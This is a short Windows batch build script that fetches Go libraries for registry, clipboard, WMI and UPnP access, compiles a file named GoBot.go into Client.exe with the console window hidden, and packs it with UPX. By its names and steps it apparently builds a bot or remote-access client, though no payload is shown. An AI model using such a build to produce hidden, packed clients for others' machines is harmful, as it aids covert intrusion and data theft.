REM fixed procRedrawWindow for 64 bit
go get github.com/gonutz/w32
go get github.com/NebulousLabs/go-upnp
go get golang.org/x/sys/windows/registry
go get github.com/StackExchange/wmi
go get github.com/atotto/clipboard
go build -o Client.exe  -ldflags "-H windowsgui" GoBot.go 
CALL %CD%/Tools/upx-3.96-win32/upx.exe Client.exe